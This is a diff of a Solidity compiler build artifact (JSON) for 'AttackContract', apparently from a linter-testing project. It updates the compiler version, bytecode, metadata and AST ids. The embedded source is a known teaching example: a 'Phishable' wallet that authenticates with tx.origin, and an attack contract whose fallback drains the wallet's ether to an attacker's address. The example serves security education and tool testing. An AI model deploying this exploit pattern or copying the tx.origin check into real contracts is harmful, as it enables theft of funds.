@@ -4,10 +4,12 @@
     {
       "inputs": [
         {
+          "internalType": "contract Phishable",
           "name": "_phishableContract",
           "type": "address"
         },
         {
+          "internalType": "address payable",
           "name": "_attackerAddress",
           "type": "address"
         }
@@ -22,9 +24,10 @@
       "type": "fallback"
     }
   ],
-  "bytecode": "0x608060405234801561001057600080fd5b506040516040806102038339810180604052604081101561003057600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610126806100dd6000396000f3fe60806040526000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fa09e630600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801560e157600080fd5b505af115801560f4573d6000803e3d6000fd5b5050505000fea165627a7a723058201e5bdc22be16b1c1ce6ba06f981ff6301c9670d71cb5893859ad4eca7975fa280029",
-  "deployedBytecode": "0x60806040526000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fa09e630600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801560e157600080fd5b505af115801560f4573d6000803e3d6000fd5b5050505000fea165627a7a723058201e5bdc22be16b1c1ce6ba06f981ff6301c9670d71cb5893859ad4eca7975fa280029",
-  "sourceMap": "470:416:6:-;;;607:187;8:9:-1;5:2;;;30:1;27;20:12;5:2;607:187:6;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;607:187:6;;;;;;;;;;;;;;;;;;;;;;;;;732:18;712:17;;:38;;;;;;;;;;;;;;;;;;771:16;760:8;;:27;;;;;;;;;;;;;;;;;;607:187;;470:416;;;;;;",
+  "metadata": "{\"compiler\":{\"version\":\"0.5.12+commit.7709ece9\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"contract Phishable\",\"name\":\"_phishableContract\",\"type\":\"address\"},{\"internalType\":\"address payable\",\"name\":\"_attackerAddress\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}],\"devdoc\":{\"methods\":{}},\"userdoc\":{\"methods\":{}}},\"settings\":{\"compilationTarget\":{\"/Users/veronicazheng/src/smart-contracts-testing/contracts/solhint-examples/Phishable.sol\":\"AttackContract\"},\"evmVersion\":\"petersburg\",\"libraries\":{},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"/Users/veronicazheng/src/smart-contracts-testing/contracts/solhint-examples/Phishable.sol\":{\"keccak256\":\"0xdd465412da41b017d1acf6e99dfee1257dd0b61d2a3c6a333e3cbcfeb64c4952\",\"urls\":[\"bzz-raw://03b9ab2d7ef8f50d3d23f286203205dc60d6415983799eaf35ee02d5f6561512\",\"dweb:/ipfs/QmShhRDNdVLFfHWLLV6KfkcobZ8UeKxFKuxRpT51dvp8py\"]}},\"version\":1}",
+  "bytecode": "0x608060405234801561001057600080fd5b506040516101f33803806101f38339818101604052604081101561003357600080fd5b810190808051906020019092919080519060200190929190505050816000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505050610113806100e06000396000f3fe60806040526000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fa09e630600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801560c557600080fd5b505af115801560d8573d6000803e3d6000fd5b5050505000fea265627a7a72315820129094d689534555cbcde5cb3987bc502b207acbc2c1fbc24b0c884fc745c73d64736f6c634300050c0032",
+  "deployedBytecode": "0x60806040526000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663fa09e630600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff166040518263ffffffff1660e01b8152600401808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff168152602001915050600060405180830381600087803b15801560c557600080fd5b505af115801560d8573d6000803e3d6000fd5b5050505000fea265627a7a72315820129094d689534555cbcde5cb3987bc502b207acbc2c1fbc24b0c884fc745c73d64736f6c634300050c0032",
+  "sourceMap": "470:416:6:-;;;607:187;8:9:-1;5:2;;;30:1;27;20:12;5:2;607:187:6;;;;;;;;;;;;;;;13:2:-1;8:3;5:11;2:2;;;29:1;26;19:12;2:2;607:187:6;;;;;;;;;;;;;;;;;;;;;;;;;732:18;712:17;;:38;;;;;;;;;;;;;;;;;;771:16;760:8;;:27;;;;;;;;;;;;;;;;;;607:187;;470:416;;;;;;",
   "deployedSourceMap": "470:416:6:-;;;838:17;;;;;;;;;;;:29;;;868:8;;;;;;;;;;;838:39;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;8:9:-1;5:2;;;30:1;27;20:12;5:2;838:39:6;;;;8:9:-1;5:2;;;45:16;42:1;39;24:38;77:16;74:1;67:27;5:2;838:39:6;;;;470:416",
   "source": "// From https://github.com/sigp/solidity-security-blog\n// Tx.Origin Authentication\n\npragma solidity ^0.5.0;\n\ncontract Phishable {\n    address public owner;\n\n    constructor(address _owner) public {\n        owner = _owner;\n    }\n\n    function() external payable {} // collect ether\n\n    function withdrawAll(address payable _recipient) external {\n        // use msg.sender\n        require(tx.origin == owner);\n        _recipient.transfer(address(this).balance);\n    }\n}\n\ncontract AttackContract {\n    Phishable phishableContract;\n    address payable attacker; // The attackers address to receive funds.\n\n    constructor(Phishable _phishableContract, address payable _attackerAddress)\n        public\n    {\n        phishableContract = _phishableContract;\n        attacker = _attackerAddress;\n    }\n\n    function() external payable {\n        phishableContract.withdrawAll(attacker);\n    }\n}\n",
   "sourcePath": "/Users/veronicazheng/src/smart-contracts-testing/contracts/solhint-examples/Phishable.sol",
@@ -260,7 +263,7 @@
                             "name": "tx",
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
-                            "referencedDeclaration": 654,
+                            "referencedDeclaration": 657,
                             "src": "388:2:6",
                             "typeDescriptions": {
                               "typeIdentifier": "t_magic_transaction",
@@ -314,10 +317,10 @@
                       "name": "require",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [
-                        645,
-                        646
+                        648,
+                        649
                       ],
-                      "referencedDeclaration": 645,
+                      "referencedDeclaration": 648,
                       "src": "380:7:6",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
@@ -357,7 +360,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 671,
+                              "referencedDeclaration": 675,
                               "src": "445:4:6",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_Phishable_$250",
@@ -1116,7 +1119,7 @@
                             "name": "tx",
                             "nodeType": "Identifier",
                             "overloadedDeclarations": [],
-                            "referencedDeclaration": 654,
+                            "referencedDeclaration": 657,
                             "src": "388:2:6",
                             "typeDescriptions": {
                               "typeIdentifier": "t_magic_transaction",
@@ -1170,10 +1173,10 @@
                       "name": "require",
                       "nodeType": "Identifier",
                       "overloadedDeclarations": [
-                        645,
-                        646
+                        648,
+                        649
                       ],
-                      "referencedDeclaration": 645,
+                      "referencedDeclaration": 648,
                       "src": "380:7:6",
                       "typeDescriptions": {
                         "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
@@ -1213,7 +1216,7 @@
                               "name": "this",
                               "nodeType": "Identifier",
                               "overloadedDeclarations": [],
-                              "referencedDeclaration": 671,
+                              "referencedDeclaration": 675,
                               "src": "445:4:6",
                               "typeDescriptions": {
                                 "typeIdentifier": "t_contract$_Phishable_$250",
@@ -1742,11 +1745,11 @@
   },
   "compiler": {
     "name": "solc",
-    "version": "0.5.0+commit.1d4f565a.Emscripten.clang"
+    "version": "0.5.12+commit.7709ece9.Emscripten.clang"
   },
   "networks": {},
-  "schemaVersion": "3.0.1",
-  "updatedAt": "2019-11-24T21:13:00.269Z",
+  "schemaVersion": "3.0.19",
+  "updatedAt": "2019-11-24T22:49:53.711Z",
   "devdoc": {
     "methods": {}
   },
